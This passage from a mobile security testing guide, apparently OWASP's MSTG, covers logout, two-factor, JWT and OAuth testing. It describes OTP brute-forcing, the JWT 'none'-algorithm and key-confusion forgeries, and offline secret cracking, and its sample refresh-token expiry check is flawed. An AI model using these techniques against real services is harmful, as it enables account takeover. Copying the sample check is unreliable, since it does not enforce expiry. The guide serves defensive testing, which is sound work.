  \href{https://docs.spring.io/autorepo/docs/spring-security/4.1.x/apidocs/org/springframework/security/web/authentication/logout/SecurityContextLogoutHandler.html}{Spring
  (Java)}
\item
  \href{https://guides.rubyonrails.org/security.html}{Ruby on Rails}
\item
  \href{https://php.net/manual/en/function.session-destroy.php}{PHP}
\end{itemize}

If access and refresh tokens are used with stateless authentication,
they should be deleted from the mobile device. The
\href{https://auth0.com/blog/blacklist-json-web-token-api-keys/}{refresh
token should be invalidated on the server}.

\hypertarget{dynamic-analysis-2}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-2}}

Use an interception proxy for dynamic application analysis and execute
the following steps to check whether the logout is implemented properly:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Log in to the application.
\item
  Access a resource that requires authentication, typically a request
  for private information belonging to your account.
\item
  Log out of the application.
\item
  Try to access the data again by resending the request from step 2.
\end{enumerate}

If the logout is correctly implemented on the server, an error message
or redirect to the login page will be sent back to the client. On the
other hand, if you receive the same response you got in step 2, the
token or session ID is still valid and hasn't been correctly terminated
on the server. The OWASP Web Testing Guide
(\href{https://www.owasp.org/index.php/Testing_for_logout_functionality_\%28OTG-SESS-006\%29}{OTG-SESS-006})
includes a detailed explanation and more test cases.

\hypertarget{testing-two-factor-authentication-and-step-up-authentication-mstg-auth-9-and-mstg-auth-10}{%
\subsubsection{Testing Two-Factor Authentication and Step-up
Authentication (MSTG-AUTH-9 and
MSTG-AUTH-10)}\label{testing-two-factor-authentication-and-step-up-authentication-mstg-auth-9-and-mstg-auth-10}}

Two-factor authentication (2FA) is standard for apps that allow users to
access sensitive functions and data. Common implementations use a
password for the first factor and any of the following as the second
factor:

\begin{itemize}
\tightlist
\item
  One-time password via SMS (SMS-OTP)
\item
  One-time code via phone call
\item
  Hardware or software token
\item
  Push notifications in combination with PKI and local authentication
\end{itemize}

Whatever option is used as 2nd factor, it always must be enforced and
verified on the server-side and never on client-side. Otherwise the 2nd
factor can be easily bypassed within the app.

The secondary authentication can be performed at login or later in the
user's session. For example, after logging in to a banking app with a
username and PIN, the user is authorized to perform non-sensitive tasks.
Once the user attempts to execute a bank transfer, the second factor
(``step-up authentication'') must be presented.

\hypertarget{dangers-of-sms-otp}{%
\paragraph{Dangers of SMS-OTP}\label{dangers-of-sms-otp}}

Although one-time passwords (OTP) sent via SMS are a common second
factor for two-factor authentication, this method has its shortcomings.
In 2016, NIST suggested: ``Due to the risk that SMS messages may be
intercepted or redirected, implementers of new systems SHOULD carefully
consider alternative authenticators.''. Below you will find a list of
some related threats and suggestions to avoid successful attacks on
SMS-OTP.

Threats:

\begin{itemize}
\tightlist
\item
  Wireless Interception: The adversary can intercept SMS messages by
  abusing femtocells and other known vulnerabilities in the
  telecommunications network.
\item
  Trojans: Installed malicious applications with access to text messages
  may forward the OTP to another number or backend.
\item
  SIM SWAP Attack: In this attack, the adversary calls the phone
  company, or works for them, and has the victim's number moved to a SIM
  card owned by the adversary. If successful, the adversary can see the
  SMS messages which are sent to the victim's phone number. This
  includes the messages used in the two-factor authentication.
\item
  Verification Code Forwarding Attack: This social engineering attack
  relies on the trust the users have in the company providing the OTP.
  In this attack, the user receives a code and is later asked to relay
  that code using the same means in which it received the information.
\item
  Voicemail: Some two-factor authentication schemes allow the OTP to be
  sent through a phone call when SMS is no longer preferred or
  available. Many of these calls, if not answered, send the information
  to voicemail. If an attacker was able to gain access to the voicemail,
  they could also use the OTP to gain access to a user's account.
\end{itemize}

You can find below several suggestions to reduce the likelihood of
exploitation when using SMS for OTP:

\begin{itemize}
\tightlist
\item
  \textbf{Messaging}: When sending an OTP via SMS, be sure to include a
  message that lets the user know 1) what to do if they did not request
  the code 2) your company will never call or text them requesting that
  they relay their password or code.
\item
  \textbf{Dedicated Channel}: When using the OS push notification
  feature (APN on iOS and FCM on Android), OTPs can be sent securely to
  a registered application. This information is, compared to SMS, not
  accessible by other applications. Alternatively of a OTP the push
  notification could trigger a pop-up to approve the requested access.\\
\item
  \textbf{Entropy}: Use authenticators with high entropy to make OTPs
  harder to crack or guess and use at least 6 digits. Make sure that
  digits are separates in smaller groups in case people have to remember
  them to copy them to your app.
\item
  \textbf{Avoid Voicemail}: If a user prefers to receive a phone call,
  do not leave the OTP information as a voicemail.
\end{itemize}

\hypertarget{transaction-signing-with-push-notifications-and-pki}{%
\paragraph{Transaction Signing with Push Notifications and
PKI}\label{transaction-signing-with-push-notifications-and-pki}}

Another alternative and strong mechanisms to implement a second factor
is transaction signing.

Transaction signing requires authentication of the user's approval of
critical transactions. Asymmetric cryptography is the best way to
implement transaction signing. The app will generate a public/private
key pair when the user signs up, then registers the public key on the
backend. The private key is securely stored in the KeyStore (Android) or
KeyChain (iOS). To authorize a transaction, the backend sends the mobile
app a push notification containing the transaction data. The user is
then asked to confirm or deny the transaction. After confirmation, the
user is prompted to unlock the Keychain (by entering the PIN or
fingerprint), and the data is signed with user's private key. The signed
transaction is then sent to the server, which verifies the signature
with the user's public key.

\hypertarget{static-analysis-4}{%
\paragraph{Static Analysis}\label{static-analysis-4}}

There are various two-factor authentication mechanism available which
can range from 3rd party libraries, usage of external apps to self
implemented checks by the developer(s).

Use the app first and identify where 2FA is needed in the workflows
(usually during login or when executing critical transactions). Do also
interview the developer(s) and/or architects to understand more about
the 2FA implementation. If a 3rd party library or external app is used,
verify if the implementation was done accordingly to the security best
practices.

\hypertarget{dynamic-testing}{%
\paragraph{Dynamic Testing}\label{dynamic-testing}}

Use the app extensively (going through all UI flows) while using an
interception proxy to capture the requests sent to remote endpoints.
Next, replay requests to endpoints that require 2FA (e.g., performing a
financial transactions) while using a token or session ID that hasn't
yet been elevated via 2FA or step-up authentication. If an endpoint is
still sending back requested data that should only be available after
2FA or step-up authentication, authentication checks haven't been
properly implemented at that endpoint.

When OTP authentication is used, consider that most OTPs are short
numeric values. An attacker can bypass the second factor by
brute-forcing the values within the range at the lifespan of the OTP if
the accounts aren't locked after N unsuccessful attempts at this stage.
The probability of finding a match for 6-digit values with a 30-second
time step within 72 hours is more than 90\%.

To test this, the captured request should be sent 10-15 times to the
endpoint with random OTP values before providing the correct OTP. If the
OTP is still accepted the 2FA implementation is prone to brute force
attacks and the OTP can be guessed.

\begin{quote}
A OTP should be valid for only a certain amount of time (usually 30
seconds) and after keying in the OTP wrongly several times (usually 3
times) the provided OTP should be invalidated and the user should be
redirected to the landing page or logged out.
\end{quote}

Consult the
\href{https://www.owasp.org/index.php/Testing_for_Session_Management}{OWASP
Testing Guide} for more information about testing session management.

\hypertarget{testing-stateless-token-based-authentication-mstg-auth-3}{%
\subsubsection{Testing Stateless (Token-Based) Authentication
(MSTG-AUTH-3)}\label{testing-stateless-token-based-authentication-mstg-auth-3}}

Token-based authentication is implemented by sending a signed token
(verified by the server) with each HTTP request. The most commonly used
token format is the JSON Web Token, defined in
\href{https://tools.ietf.org/html/rfc7519}{RFC7519}. A JWT may encode
the complete session state as a JSON object. Therefore, the server
doesn't have to store any session data or authentication information.

JWT tokens consist of three Base64Url-encoded parts separated by dots.
Token structure example:

\begin{verbatim}
<base64UrlEncode(header)>.<base64UrlEncode(payload)>.<base64UrlEncode(signature)>
\end{verbatim}

The following example shows a
\href{https://jwt.io/\#debugger}{Base64Url-encoded JSON Web Token}:

\begin{verbatim}
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
\end{verbatim}

The \emph{header} typically consists of two parts: the token type, which
is JWT, and the hashing algorithm being used to compute the signature.
In the example above, the header decodes as follows:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{\{}\DataTypeTok{"alg"}\FunctionTok{:}\StringTok{"HS256"}\FunctionTok{,}\DataTypeTok{"typ"}\FunctionTok{:}\StringTok{"JWT"}\FunctionTok{\}}
\end{Highlighting}
\end{Shaded}

The second part of the token is the \emph{payload}, which contains
so-called claims. Claims are statements about an entity (typically, the
user) and additional metadata. For example:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{\{}\DataTypeTok{"sub"}\FunctionTok{:}\StringTok{"1234567890"}\FunctionTok{,}\DataTypeTok{"name"}\FunctionTok{:}\StringTok{"John Doe"}\FunctionTok{,}\DataTypeTok{"admin"}\FunctionTok{:}\KeywordTok{true}\FunctionTok{\}}
\end{Highlighting}
\end{Shaded}

The signature is created by applying the algorithm specified in the JWT
header to the encoded header, encoded payload, and a secret value. For
example, when using the HMAC SHA256 algorithm the signature is created
in the following way:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{HMACSHA256}\NormalTok{(}\FunctionTok{base64UrlEncode}\NormalTok{(header) + }\StringTok{"."}\NormalTok{ + }\FunctionTok{base64UrlEncode}\NormalTok{(payload), secret)}
\end{Highlighting}
\end{Shaded}

Note that the secret is shared between the authentication server and the
backend service - the client does not know it. This proves that the
token was obtained from a legitimate authentication service. It also
prevents the client from tampering with the claims contained in the
token.

\hypertarget{static-analysis-5}{%
\paragraph{Static Analysis}\label{static-analysis-5}}

Identify the JWT library that the server and client use. Find out
whether the JWT libraries in use have any known vulnerabilities.

Verify that the implementation adheres to JWT
\href{https://stormpath.com/blog/jwt-the-right-way}{best practices}:

\begin{itemize}
\tightlist
\item
  Verify that the HMAC is checked for all incoming requests containing a
  token;
\item
  Verify the location of the private signing key or HMAC secret key. The
  key should remain on the server and should never be shared with the
  client. It should be available for the issuer and verifier only.
\item
  Verify that no sensitive data, such as personal identifiable
  information, is embedded in the JWT. If, for some reason, the
  architecture requires transmission of such information in the token,
  make sure that payload encryption is being applied. See the sample
  Java implementation on the \href{https://goo.gl/TGzA5z}{OWASP JWT
  Cheat Sheet}.
\item
  Make sure that replay attacks are addressed with the \texttt{jti} (JWT
  ID) claim, which gives the JWT a unique identifier.
\item
  Verify that tokens are stored securely on the mobile phone, with, for
  example, KeyChain (iOS) or KeyStore (Android).
\end{itemize}

\hypertarget{enforcing-the-hashing-algorithm}{%
\subparagraph{Enforcing the Hashing
Algorithm}\label{enforcing-the-hashing-algorithm}}

An attacker executes this by altering the token and, using the `none'
keyword, changing the signing algorithm to indicate that the integrity
of the token has already been verified. As explained at the link above,
some libraries treated tokens signed with the none algorithm as if they
were valid tokens with verified signatures, so the application will
trust altered token claims.

For example, in Java applications, the expected algorithm should be
requested explicitly when creating the verification context:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// HMAC key {-} Block serialization and storage as String in JVM memory}
\KeywordTok{private} \KeywordTok{transient} \DataTypeTok{byte}\NormalTok{[] keyHMAC = ...;}

\CommentTok{//Create a verification context for the token requesting explicitly the use of the HMAC{-}256 HMAC generation}

\NormalTok{JWTVerifier verifier = JWT.}\FunctionTok{require}\NormalTok{(Algorithm.}\FunctionTok{HMAC256}\NormalTok{(keyHMAC)).}\FunctionTok{build}\NormalTok{();}

\CommentTok{//Verify the token; if the verification fails then an exception is thrown}

\NormalTok{DecodedJWT decodedToken = verifier.}\FunctionTok{verify}\NormalTok{(token);}
\end{Highlighting}
\end{Shaded}

\hypertarget{token-expiration}{%
\subparagraph{Token Expiration}\label{token-expiration}}

Once signed, a stateless authentication token is valid forever unless
the signing key changes. A common way to limit token validity is to set
an expiration date. Make sure that the tokens include an
\href{https://tools.ietf.org/html/rfc7519\#section-4.1.4}{``exp''
expiration claim} and the backend doesn't process expired tokens.

A common method of granting tokens combines
\href{https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/}{access
tokens and refresh tokens}. When the user logs in, the backend service
issues a short-lived \emph{access token} and a long-lived \emph{refresh
token}. The application can then use the refresh token to obtain a new
access token, if the access token expires.

For apps that handle sensitive data, make sure that the refresh token
expires after a reasonable period of time. The following example code
shows a refresh token API that checks the refresh token's issue date. If
the token is not older than 14 days, a new access token is issued.
Otherwise, access is denied and the user is prompted to login again.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{ app.}\FunctionTok{post}\NormalTok{(\textquotesingle{}/renew\_access\_token\textquotesingle{}, }\FunctionTok{function}\NormalTok{ (req, res) \{}
  \CommentTok{// verify the existing refresh token}
\NormalTok{  var profile = jwt.}\FunctionTok{verify}\NormalTok{(req.}\FunctionTok{body}\NormalTok{.}\FunctionTok{token}\NormalTok{, secret);}

  \CommentTok{// if refresh token is more than 14 days old, force login}
  \KeywordTok{if}\NormalTok{ (profile.}\FunctionTok{original\_iat}\NormalTok{ {-} }\KeywordTok{new} \BuiltInTok{Date}\NormalTok{() > }\DecValTok{14}\NormalTok{) \{ }\CommentTok{// iat == issued at}
    \KeywordTok{return}\NormalTok{ res.}\FunctionTok{send}\NormalTok{(}\DecValTok{401}\NormalTok{); }\CommentTok{// re{-}login}
\NormalTok{  \}}

  \CommentTok{// check if the user still exists or if authorization hasn\textquotesingle{}t been revoked}
  \KeywordTok{if}\NormalTok{ (!valid) }\KeywordTok{return}\NormalTok{ res.}\FunctionTok{send}\NormalTok{(}\DecValTok{401}\NormalTok{); }\CommentTok{// re{-}logging}

  \CommentTok{// issue a new access token}
\NormalTok{  var renewed\_access\_token = jwt.}\FunctionTok{sign}\NormalTok{(profile, secret, \{ expiresInMinutes: }\DecValTok{60}\NormalTok{*}\DecValTok{5}\NormalTok{ \});}
\NormalTok{  res.}\FunctionTok{json}\NormalTok{(\{ token: renewed\_access\_token \});}
\NormalTok{\});}
\end{Highlighting}
\end{Shaded}

\hypertarget{dynamic-analysis-3}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-3}}

Investigate the following JWT vulnerabilities while performing dynamic
analysis:

\begin{itemize}
\tightlist
\item
  Token Storage on the client:

  \begin{itemize}
  \tightlist
  \item
    The token storage location should be verified for mobile apps that
    use JWT.
  \end{itemize}
\item
  Cracking the signing key:

  \begin{itemize}
  \tightlist
  \item
    Token signatures are created via a private key on the server. After
    you obtain a JWT, choose a tool for
    \href{https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/}{brute
    forcing the secret key offline}.
  \end{itemize}
\item
  Information Disclosure:

  \begin{itemize}
  \tightlist
  \item
    Decode the Base64Url-encoded JWT and find out what kind of data it
    transmits and whether that data is encrypted.
  \end{itemize}
\item
  Tampering with the Hashing Algorithm:

  \begin{itemize}
  \tightlist
  \item
    Usage of
    \href{https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/}{asymmetric
    algorithms}. JWT offers several asymmetric algorithms as RSA or
    ECDSA. When these algorithms are used, tokens are signed with the
    private key and the public key is used for verification. If a server
    is expecting a token to be signed with an asymmetric algorithm and
    receives a token signed with HMAC, it will treat the public key as
    an HMAC secret key. The public key can then be misused, employed as
    an HMAC secret key to sign the tokens.
  \item
    Modify the \texttt{alg} attribute in the token header, then delete
    \texttt{HS256}, set it to \texttt{none}, and use an empty signature
    (e.g., signature = "``). Use this token and replay it in a request.
    Some libraries treat tokens signed with the none algorithm as a
    valid token with a verified signature. This allows attackers to
    create their own''signed" tokens.
  \end{itemize}
\end{itemize}

There are two different Burp Plugins that can help you for testing the
vulnerabilities listed above:

\begin{itemize}
\tightlist
\item
  \href{https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61}{JSON
  Web Token Attacker}
\item
  \href{https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6}{JSON
  Web Tokens}
\end{itemize}

Also, make sure to check out the \href{https://goo.gl/TGzA5z}{OWASP JWT
Cheat Sheet} for additional information.

\hypertarget{testing-oauth-2.0-flows-mstg-auth-1-and-mstg-auth-3}{%
\subsubsection{Testing OAuth 2.0 Flows (MSTG-AUTH-1 and
MSTG-AUTH-3)}\label{testing-oauth-2.0-flows-mstg-auth-1-and-mstg-auth-3}}

\href{https://oauth.net/articles/authentication/}{OAuth 2.0 defines a
delegation protocol for conveying authorization decisions across APIs
and a network of web-enabled applications}. It is used in a variety of
applications, including user authentication applications.

Common uses for OAuth2 include:

\begin{itemize}
\tightlist
\item
  Getting permission from the user to access an online service using
  their account.
\item
  Authenticating to an online service on behalf of the user.
\item
  Handling authentication errors.
\end{itemize}

According to OAuth 2.0, a mobile client seeking access to a user's
resources must first ask the user to authenticate against an
\emph{authentication server}. With the users' approval, the
authorization server then issues a token that allows the app to act on
behalf of the user. Note that the OAuth2 specification doesn't define
any particular kind of authentication or access token format.

OAuth 2.0 defines four roles:

\begin{itemize}
\tightlist
\item
  Resource Owner: the account owner
\item
  Client: the application that wants to access the user's account with
  the access tokens
\item
  Resource Server: hosts the user accounts
\item
  Authorization Server: verifies user identity and issues access tokens
  to the application
\end{itemize}

Note: The API fulfills both the Resource Owner and Authorization Server
roles. Therefore, we will refer to both as the API.

\begin{figure}
\centering
\includegraphics[width=4.6875in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/de11985a944d62f6043f7925b67f1282123b016d.png}
\caption{Abstract Protocol Flow}
\end{figure}

Here is a more
\href{https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2}{detailed
explanation} of the steps in the diagram:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  The application requests user authorization to access service
  resources.
\item
  If the user authorizes the request, the application receives an
  authorization grant. The authorization grant may take several forms
  (explicit, implicit, etc.).
\item
  The application requests an access token from the authorization server
  (API) by presenting authentication of its own identity along with the
  authorization grant.
\item
  If the application identity is authenticated and the authorization
  grant is valid, the authorization server (API) issues an access token
  to the application, completing the authorization process. The access
  token may have a companion refresh token.
\item
  The application requests the resource from the resource server (API)
  and presents the access token for authentication. The access token may
  be used in several ways (e.g., as a bearer token).
\item
  If the access token is valid, the resource server (API) serves the
  resource to the application.
\end{enumerate}

\hypertarget{oauth-2.0-best-practices}{%
\paragraph{OAUTH 2.0 Best Practices}\label{oauth-2.0-best-practices}}

Verify that the following best practices are followed:

User agent:

\begin{itemize}
\tightlist
\item
  The user should have a way to visually verify trust (e.g., Transport
  Layer Security (TLS) confirmation, website mechanisms).
\item
  To prevent man-in-the-middle attacks, the client should validate the
  server's fully qualified domain name with the public key the server
  presented when the connection was established.
\end{itemize}

Type of grant:

\begin{itemize}
\tightlist
\item
  On native apps, code grant should be used instead of implicit grant.
\item
  When using code grant, PKCE (Proof Key for Code Exchange) should be
  implemented to protect the code grant. Make sure that the server also
  implements it.
\item
  The auth ``code'' should be short-lived and used immediately after it
  is received. Verify that auth codes only reside on transient memory
  and aren't stored or logged.
\end{itemize}

Client secrets:

\begin{itemize}
\tightlist
\item
  Shared secrets should not be used to prove the client's identity
  because the client could be impersonated (``client\_id'' already
  serves as proof). If they do use client secrets, be sure that they are
  stored in secure local storage.
\end{itemize}

End-User credentials:

\begin{itemize}
\tightlist
\item
  Secure the transmission of end-user credentials with a transport-layer
  method, such as TLS.
\end{itemize}

Tokens:

\begin{itemize}
\tightlist
\item
  Keep access tokens in transient memory.
\item
  Access tokens must be transmitted over an encrypted connection.
\item
  Reduce the scope and duration of access tokens when end-to-end
  confidentiality can't be guaranteed or the token provides access to
  sensitive information or transactions.
\item
  Remember that an attacker who has stolen tokens can access their scope
  and all resources associated with them if the app uses access tokens
  as bearer tokens with no other way to identify the client.
\item
  Store refresh tokens in secure local storage; they are long-term
  credentials.
\end{itemize}

\hypertarget{external-user-agent-vs.-embedded-user-agent}{%
\subparagraph{External User Agent vs.~Embedded User
Agent}\label{external-user-agent-vs.-embedded-user-agent}}

OAuth2 authentication can be performed either through an external user
agent (e.g.~Chrome or Safari) or in the app itself (e.g.~through a
WebView embedded into the app or an authentication library). None of the
two modes is intrinsically ``better'' - instead, what mode to choose
depends on the context.

Using an \emph{external user agent} is the method of choice for apps
that need to interact with social media accounts (Facebook, Twitter,
etc.). Advantages of this method include:

\begin{itemize}
\item
  The user's credentials are never directly exposed to the app. This
  guarantees that the app cannot obtain the credentials during the login
  process (``credential phishing'').
\item
  Almost no authentication logic must be added to the app itself,
  preventing coding errors.
\end{itemize}

On the negative side, there is no way to control the behavior of the
browser (e.g.~to activate certificate pinning).

For apps that operate within a closed ecosystem, \emph{embedded
authentication} is the better choice. For example, consider a banking
app that uses OAuth2 to retrieve an access token from the bank's
authentication server, which is then used to access a number of micro
services. In that case, credential phishing is not a viable scenario. It
is likely preferable to keep the authentication process in the
(hopefully) carefully secured banking app, instead of placing trust on
external components.

\hypertarget{other-oauth2-best-practices}{%
\paragraph{Other OAuth2 Best
Practices}\label{other-oauth2-best-practices}}

For additional best practices and detailed information please refer to
the following source documents:

\begin{itemize}
\tightlist
\item
  \href{https://tools.ietf.org/html/rfc6749}{RFC6749 - The OAuth 2.0
  Authorization Framework}
\item
  \href{https://tools.ietf.org/html/draft-ietf-oauth-native-apps-12}{DRAFT
  - OAuth 2.0 for Native Apps}
\item
  \href{https://tools.ietf.org/html/rfc6819}{RFC6819 - OAuth 2.0 Threat
  Model and Security Considerations}
\end{itemize}

\hypertarget{testing-login-activity-and-device-blocking-mstg-auth-11}{%
\subsubsection{Testing Login Activity and Device Blocking
(MSTG-AUTH-11)}\label{testing-login-activity-and-device-blocking-mstg-auth-11}}

For applications which require L2 protection, the MASVS states that they
should inform the user about all login activities within the app with
the possiblity of blocking certain devices. This can be broken down into
various scenarios:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  The application provides a push notification the moment their account
  is used on another device to notify the user of different activities.
  The user can then block this device after opening the app via the
  push-notification.
\item
  The application provides an overview of the last session after login.
  If the previous session was with a different configuration
  (e.g.~location, device, app-version) compared to the current
  configuration, then the user should have the option to report
  suspicious activities and block devices used in the previous session.
\item
  The application provides an overview of the last session after login
  at all times.
\item
  The application has a self-service portal in which the user can see an
  audit-log. This allows the user to manage the different devices that
  are logged in.
\end{enumerate}

The developer can make use of specific meta-information and associate it
to each different activity or event within the application. This will
make it easier for the user to spot suspicious behavior and block the
corresponding device. The meta-information may include:

\begin{itemize}
\tightlist
\item
  Device: The user can clearly identify all devices where the app is
  being used.
\item
  Date and Time: The user can clearly see the latest date and time when
  the app was used.
\item
  Location: The user can clearly identify the latest locations where the
  app was used.
\end{itemize}

The application can provide a list of activities history which will be
updated after each sensitive activity within the application. The choice
of which activities to audit needs to be done for each application based
on the data it handles and the level of security risk the team is
willing to have. Below is a list of common sensitive activities that are
usually audited:

\begin{itemize}
\tightlist
\item
  Login attempts
\item
  Password changes
\item
  Personal Identifiable Information changes (name, email address,
  telephone number, etc.)
\item
  Sensitive activities (purchase, accessing important resources, etc.)
\item
  Consent to Terms and Conditions clauses
\end{itemize}

Paid content requires special care, and additional meta-information
(e.g., operation cost, credit, etc.) might be used to ensure user's
knowledge about the whole operation's parameters.

In addition, non-repudiation mechanisms should be applied to sensitive
transactions (e.g.~payed content access, given consent to Terms and
Conditions clauses, etc.) in order to prove that a specific transaction
was in fact performed (integrity) and by whom (authentication).

In all cases, you should verify whether different devices are detected
correctly. Therefore, the binding of the application to the actual
device should be tested. In iOS, a developer can use
\texttt{identifierForVendor}, which is related to the bundle ID: the
moment you change a bundle ID, the method will return a different value.
When the app is ran for the first time, make sure you store the value
returned by \texttt{identifierForVendor} to the KeyChain, so that
changes to it can be detected at an early stage.

In Android, the developer can use \texttt{Settings.Secure.ANDROID\_ID}
till Android 8.0 (API level 26) to identify an application instance.
Note that starting at Android 8.0 (API level 26), \texttt{ANDROID\_ID}
is no longer a device unique ID. Instead, it becomes scoped by the
combination of app signing key, user and device. So validating
\texttt{ANDROID\_ID} for device blocking could be tricky for these
Android versions. Because if an app changes its signing key, the
\texttt{ANDROID\_ID} will change and it won't be able to recognize old
users devices. Therefore, it's better to store the \texttt{ANDROID\_ID}
encrypted and privately in a private a shared preferences file using a
randomly generated key from the \texttt{AndroidKeyStore} and preferably
AES\_GCM encryption. The moment the app signature changes, the
application can check for a delta and register the new
\texttt{ANDROID\_ID}. The moment this new ID changes without a new
application signing key, it should indicate that something else is
wrong. Next, the device binding can be extended by signing requests with
a key stored in the \texttt{Keychain} for iOS and in the
\texttt{KeyStore} in Android can reassure strong device binding. You
should also test if using different IPs, different locations and/or
different time-slots will trigger the right type of information in all
scenarios.

Lastly, the blocking of the devices should be tested, by blocking a
registered instance of the app and see if it is then no longer allowed
to authenticate. Note: in case of an application which requires L2
protection, it can be a good idea to warn a user even before the first
authentication on a new device. Instead: warn the user already when a
second instance of the app is registered.

\hypertarget{references-2}{%
\subsubsection{References}\label{references-2}}

\hypertarget{owasp-masvs-1}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-1}}

\begin{itemize}
\tightlist
\item
  MSTG-ARCH-2: ``Security controls are never enforced only on the client
  side, but on the respective remote endpoints.''
\item
  MSTG-AUTH-1: ``If the app provides users access to a remote service,
  some form of authentication, such as username/password authentication,
  is performed at the remote endpoint.''
\item
  MSTG-AUTH-2: ``If stateful session management is used, the remote
  endpoint uses randomly generated session identifiers to authenticate
  client requests without sending the user's credentials.''
\item
  MSTG-AUTH-3: ``If stateless token-based authentication is used, the
  server provides a token that has been signed using a secure
  algorithm.''
\item
  MSTG-AUTH-4: ``The remote endpoint terminates the existing session
  when the user logs out.''
\item
  MSTG-AUTH-5: ``A password policy exists and is enforced at the remote
  endpoint.''
\item
  MSTG-AUTH-6: ``The remote endpoint implements a mechanism to protect
  against the submission of credentials an excessive number of times.''
\item
  MSTG-AUTH-7: ``Sessions are invalidated at the remote endpoint after a
  predefined period of inactivity and access tokens expire.''
\item
  MSTG-AUTH-9: ``A second factor of authentication exists at the remote
  endpoint and the 2FA requirement is consistently enforced.''
\item
  MSTG-AUTH-10: ``Sensitive transactions require step-up
  authentication.''
\item
  MSTG-AUTH-11: ``The app informs the user of all sensitive activities
  with their account. Users are able to view a list of devices, view
  contextual information (IP address, location, etc.), and to block
  specific devices.''
\end{itemize}

\hypertarget{sms-otp-research}{%
\subparagraph{SMS-OTP Research}\label{sms-otp-research}}

\begin{itemize}
\tightlist
\item
  {[}\#dmitrienko{]} Dmitrienko, Alexandra, et al.~``On the (in)
  security of mobile two-factor authentication.'' International
  Conference on Financial Cryptography and Data Security. Springer,
  Berlin, Heidelberg, 2014.
\item
  {[}\#grassi{]} Grassi, Paul A., et al.~Digital identity guidelines:
  Authentication and lifecycle management (DRAFT). No.~Special
  Publication (NIST SP)-800-63B. 2016.
\item
  {[}\#grassi2{]} Grassi, Paul A., et al.~Digital identity guidelines:
  Authentication and lifecycle management. No.~Special Publication (NIST
  SP)-800-63B. 2017.
\item
  {[}\#konoth{]} Konoth, Radhesh Krishnan, Victor van der Veen, and
  Herbert Bos. ``How anywhere computing just killed your phone-based
  two-factor authentication.'' International Conference on Financial
  Cryptography and Data Security. Springer, Berlin, Heidelberg, 2016.
\item
  {[}\#mulliner{]} Mulliner, Collin, et al.~``SMS-based one-time
  passwords: attacks and defense.'' International Conference on
  Detection of Intrusions and Malware, and Vulnerability Assessment.
  Springer, Berlin, Heidelberg, 2013.
\item
  {[}\#siadati{]} Siadati, Hossein, et al.~``Mind your SMSes: Mitigating
  social engineering in second factor authentication.'' Computers \&
  Security 65 (2017): 14-28.
\item
  {[}\#siadati2{]} Siadati, Hossein, Toan Nguyen, and Nasir Memon.
  ``Verification code forwarding attack (short paper).'' International
  Conference on Passwords. Springer, Cham, 2015.
\end{itemize}

\hypertarget{tools-1}{%
\subparagraph{Tools}\label{tools-1}}

\begin{itemize}
\tightlist
\item
  Burp Suite - \url{https://portswigger.net/burp/}
\item
  Using Burp Intruder -
  \url{https://portswigger.net/burp/documentation/desktop/tools/intruder/using}
\item
  OWASP ZAP -
  \url{https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project}
\item
  jwtbrute - \url{https://github.com/jmaxxz/jwtbrute}
\item
  crackjwt -
  \url{https://github.com/Sjord/jwtcrack/blob/master/crackjwt.py}
\item
  John the ripper - \url{https://github.com/magnumripper/JohnTheRipper}
\end{itemize}

\hypertarget{testing-network-communication}{%
\subsection{Testing Network
Communication}\label{testing-network-communication}}

Practically every network-connected mobile app uses the Hypertext
Transfer Protocol (HTTP) or HTTP over Transport Layer Security (TLS),
HTTPS, to send and receive data to and from remote endpoints.
Consequently, network-based attacks (such as packet sniffing and
man-in-the-middle-attacks) are a problem. In this chapter we discuss
potential vulnerabilities, testing techniques, and best practices
concerning the network communication between mobile apps and their
endpoints.

\hypertarget{intercepting-https-traffic}{%
\subsubsection{Intercepting HTTP(S)
Traffic}\label{intercepting-https-traffic}}

In many cases, it is most practical to configure a system proxy on the
mobile device, so that HTTP(S) traffic is redirected through an
\emph{interception proxy} running on your host machine. By monitoring
the requests between the mobile app client and the backend, you can
easily map the available server-side APIs and gain insight into the
communication protocol. Additionally, you can replay and manipulate
requests to test for server-side vulnerabilities.

Several free and commercial proxy tools are available. Here are some of
the most popular:

\begin{itemize}
\tightlist
\item
  \href{https://portswigger.net/burp}{Burp Suite}
\item
  \href{https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project}{OWASP
  ZAP}
\item
  \href{https://www.charlesproxy.com}{Charles Proxy}
\end{itemize}

To use the interception proxy, you'll need run it on your machine and
configure the mobile app to route HTTP(S) requests to your proxy. In
most cases, it is enough to set a system-wide proxy in the network
settings of the mobile device - if the app uses standard HTTP APIs or
popular libraries such as \texttt{okhttp}, it will automatically use the
system settings.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/885ac03015d3917ef0a32901cacaf58cedaef149.png}
\caption{Images/Chapters/0x04f/BURP.png}
\end{figure}

Using a proxy breaks SSL certificate verification and the app will
usually fail to initiate TLS connections. To work around this issue, you
can install your proxy's CA certificate on the device. We'll explain how
to do this in the OS-specific ``Basic Security Testing'' chapters.

